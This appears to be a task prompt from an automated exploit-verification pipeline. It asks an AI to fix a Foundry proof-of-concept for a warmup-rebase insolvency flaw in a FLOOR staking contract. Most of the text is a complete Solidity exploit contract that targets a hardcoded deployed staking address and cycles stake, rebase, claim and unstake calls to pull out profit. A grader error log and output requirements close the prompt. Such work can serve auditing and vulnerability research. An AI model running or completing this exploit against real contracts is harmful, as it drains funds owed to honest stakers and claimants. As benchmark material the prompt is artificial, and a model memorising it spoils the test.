You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Warmup deposits are rebased but never counted as liabilities, allowing staking insolvency
- claim: `stake()` transfers FLOOR into the contract and records warmup positions as `deposit` plus `gons`, while `claim()` later pays `sFLOOR.balanceForGons(info.gons)`, so warmup balances continue to appreciate with rebases. However, `rebase()` computes distributable surplus from `FLOOR.balanceOf(address(this)) - sFLOOR.circulatingSupply() - bounty` and never subtracts `gonsInWarmup` or `supplyInWarmup()`. Warmup-backed FLOOR is therefore treated as free excess reserves and redistributed to current stakers even though it is still owed to warmup claimants.
- impact: Large warmup balances can make the system undercollateralized. After one or more rebases, the contract can owe more sFLOOR/gFLOOR/FLOOR than it holds backing for, causing honest claimants or unstakers to receive unbacked positions or hit `unstake()` reverts due to insufficient FLOOR reserves.
- exploit_paths: ["Set `warmupPeriod > 0` and let some users already hold active staking positions.", "A user stakes FLOOR into warmup, increasing `gonsInWarmup` but not `sFLOOR.circulatingSupply()`.", "When `rebase()` runs, the newly deposited FLOOR is included in `balance` and treated as surplus because warmup liabilities are not subtracted.", "Existing stakers receive that value through rebases, while the warmup user still retains a claim for `sFLOOR.balanceForGons(info.gons)`.", "Total redeemable claims eventually exceed the contract's FLOOR backing, and withdrawals start failing."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IsFLOORLike is IERC20Like {
    function circulatingSupply() external view returns (uint256);
    function balanceForGons(uint256 gons) external view returns (uint256);
}

interface IgFLOORLike is IERC20Like {
    function balanceFrom(uint256 amount) external view returns (uint256);
    function balanceTo(uint256 amount) external view returns (uint256);
}

interface IStakingLike {
    function FLOOR() external view returns (address);
    function sFLOOR() external view returns (address);
    function gFLOOR() external view returns (address);

    function warmupPeriod() external view returns (uint256);
    function epoch() external view returns (uint256 length, uint256 number, uint256 end, uint256 distribute);
    function warmupInfo(address account)
        external
        view
        returns (uint256 deposit, uint256 gons, uint256 expiry, bool lock);

    function stake(address to, uint256 amount, bool rebasing, bool claimNow) external returns (uint256);
    function claim(address to, bool rebasing) external returns (uint256);
    function unstake(address to, uint256 amount, bool trigger, bool rebasing) external returns (uint256);
    function rebase() external returns (uint256);
}

contract FlawVerifier {
    IStakingLike internal constant STAKING =
        IStakingLike(0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539);

    bool private baselineCaptured;
    uint256 private baselineEquityInFloor;
    uint256 private realizedProfitInFloor;

    constructor() {}

    function executeOnOpportunity() public {
        _captureBaseline();

        uint256 warmup = STAKING.warmupPeriod();
        if (warmup == 0) {
            // The reported exploit path requires warmup deposits.
            _syncProfit();
            return;
        }

        if (_sFloor().circulatingSupply() == 0) {
            // The bug needs an existing active rebasing supply for the warmup deposit
            // to be treated as surplus against current stakers.
            _syncProfit();
            return;
        }

        // Same-transaction realization without time cheats requires enough already-
        // overdue epochs to both:
        // 1. include the warmup deposit in a rebase-surplus calculation, and
        // 2. mature the warmup claim before this single harness call ends.
        if (_remainingImmediateRebases() < warmup + 1) {
            _syncProfit();
            return;
        }

        _approveSpenders();

        // Funding conversion only unwraps verifier-held positions into FLOOR so the
        // claimed warmup/rebase path can be attempted with real assets already owned
        // by this contract. It does not alter the exploit root cause.
        _bootstrapFloorBalance();

        for (uint256 i = 0; i < 3; ++i) {
            uint256 floorBalance = _floor().balanceOf(address(this));
            if (floorBalance == 0) {
                break;
            }

            if (_remainingImmediateRebases() < warmup + 1) {
                break;
            }

            STAKING.stake(address(this), floorBalance, true, false);

            _consumeImmediateRebases();
            _tryClaim();
            _approveSpenders();
            _realizeClaimedSFloor();
        }

        _syncProfit();
    }

    function profitToken() external view returns (address) {
        return STAKING.FLOOR();
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitInFloor;
    }

    function _captureBaseline() internal {
        if (!baselineCaptured) {
            baselineCaptured = true;
            baselineEquityInFloor = _currentEquityInFloor();
        }
    }

    function _bootstrapFloorBalance() internal {
        if (_floor().balanceOf(address(this)) != 0) {
            return;
        }

        _redeemVerifierSFloor();

        if (_floor().balanceOf(address(this)) != 0) {
            return;
        }

        _redeemVerifierGFloor();
    }

    function _redeemVerifierSFloor() internal {
        uint256 sBalance = _sFloor().balanceOf(address(this));
        if (sBalance == 0) {
            return;
        }

        uint256 reserves = _floor().balanceOf(address(STAKING));
        if (reserves == 0) {
            return;
        }

        uint256 amount = sBalance < reserves ? sBalance : reserves;
        if (amount == 0) {
            return;
        }

        try STAKING.unstake(address(this), amount, _epochReady(), true) returns (uint256) {
            return;
        } catch {}

        try STAKING.unstake(address(this), amount, false, true) returns (uint256) {
            return;
        } catch {}
    }

    function _redeemVerifierGFloor() internal {
        uint256 gBalance = _gFloor().balanceOf(address(this));
        if (gBalance == 0) {
            return;
        }

        uint256 reserves = _floor().balanceOf(address(STAKING));
        if (reserves == 0) {
            return;
        }

        uint256 maxGByReserves = _gFloor().balanceTo(reserves);
        uint256 amount = gBalance < maxGByReserves ? gBalance : maxGByReserves;
        if (amount == 0) {
            return;
        }

        try STAKING.unstake(address(this), amount, _epochReady(), false) returns (uint256) {
            return;
        } catch {}

        try STAKING.unstake(address(this), amount, false, false) returns (uint256) {
            return;
        } catch {}
    }

    function _consumeImmediateRebases() internal {
        for (uint256 i = 0; i < 64; ++i) {
            if (!_epochReady()) {
                break;
            }
            STAKING.rebase();
        }
    }

    function _tryClaim() internal {
        (, uint256 gons, uint256 expiry,) = STAKING.warmupInfo(address(this));
        if (gons == 0 || expiry == 0) {
            return;
        }

        STAKING.claim(address(this), true);
    }

    function _realizeClaimedSFloor() internal {
        uint256 sBalance = _sFloor().balanceOf(address(this));
        if (sBalance == 0) {
            return;
        }

        uint256 reserves = _floor().balanceOf(address(STAKING));
        if (reserves == 0) {
            return;
        }

        uint256 amount = sBalance < reserves ? sBalance : reserves;
        if (amount == 0) {
            return;
        }

        try STAKING.unstake(address(this), amount, _epochReady(), true) returns (uint256) {
            return;
        } catch {}

        // If insolvency makes the optimistic path revert, fall back to a plain
        // redemption capped by current FLOOR reserves to realize the maximum amount
        // currently withdrawable by this contract.
        try STAKING.unstake(address(this), amount, false, true) returns (uint256) {
            return;
        } catch {}
    }

    function _approveSpenders() internal {
        _floor().approve(address(STAKING), type(uint256).max);
        _sFloor().approve(address(STAKING), type(uint256).max);
    }

    function _currentEquityInFloor() internal view returns (uint256 equity) {
        equity = _floor().balanceOf(address(this));
        equity += _sFloor().balanceOf(address(this));

        uint256 gBalance = _gFloor().balanceOf(address(this));
        if (gBalance != 0) {
            equity += _gFloor().balanceFrom(gBalance);
        }

        (, uint256 gons,,) = STAKING.warmupInfo(address(this));
        if (gons != 0) {
            equity += _sFloor().balanceForGons(gons);
        }
    }

    function _remainingImmediateRebases() internal view returns (uint256) {
        (uint256 length,, uint256 end,) = STAKING.epoch();
        if (end > block.timestamp) {
            return 0;
        }
        if (length == 0) {
            return 0;
        }
        return ((block.timestamp - end) / length) + 1;
    }

    function _epochReady() internal view returns (bool) {
        (, , uint256 end,) = STAKING.epoch();
        return end <= block.timestamp;
    }

    function _floor() internal view returns (IERC20Like) {
        return IERC20Like(STAKING.FLOOR());
    }

    function _sFloor() internal view returns (IsFLOORLike) {
        return IsFLOORLike(STAKING.sFLOOR());
    }

    function _gFloor() internal view returns (IgFLOORLike) {
        return IgFLOORLike(STAKING.gFLOOR());
    }

    function _syncProfit() internal {
        uint256 currentFloorBalance = _floor().balanceOf(address(this));
        if (currentFloorBalance > baselineEquityInFloor) {
            realizedProfitInFloor = currentFloorBalance - baselineEquityInFloor;
        } else {
            realizedProfitInFloor = 0;
        }
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: warmupperiod > 0, gonsinwarmup, sfloor.circulatingsupply(), sfloor.balanceforgons(info.gons); generated code does not cover paths indexes: 0, 1, 3
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
